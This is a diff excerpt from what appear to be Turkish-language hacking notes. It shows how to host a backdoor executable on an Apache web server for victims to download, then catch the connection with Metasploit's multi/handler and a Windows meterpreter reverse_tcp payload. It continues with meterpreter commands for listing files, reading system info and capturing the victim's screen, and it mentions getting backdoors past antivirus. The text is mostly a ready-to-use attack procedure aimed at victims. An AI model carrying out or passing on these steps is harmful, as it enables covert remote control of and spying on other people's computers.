@@ -25,3 +25,19 @@
 ~File > var > www > html // buraya .exe dosyasını yapıştır
 
 > service apache2 start // Makinen web sunucusu olur. Cihazın ip sine gidildiğinde web sitesi karşılar.
+
+\*\*\* Kullanıcı dosyayı indirip çalıştırırsa (Bir Backdoor'un virüs programına takılmaması çok zor. Bunun için birçok araç var):
+
+> msfconsole //Kullanıcı indirip çalıştırmışsa
+> use exploit/multi/handler
+> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri
+> msf6 exploit(multi/handler) > show options
+> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
+> msf6 exploit(multi/handler) > set LPORT 8080
+> msf6 exploit(multi/handler) > exploit -j -z
+> msf6 exploit(multi/handler) > session -l
+> msf6 exploit(multi/handler) > session -1
+> meterpreter > ls //yaptığında kurban bilgisayarın bilgileri çıkar
+> meterpreter > sysinfo // Hedef makine hakkında temel sistem bilgilerini gösterir.
+> meterpreter > help // Alabileceğin tüm özellik ve bilgiler. ScreenShot-webcam-mouse...
+> meterpreter > screenshot //kurbanın o anki ekran görüntüsünü alır hacker a kaydeder
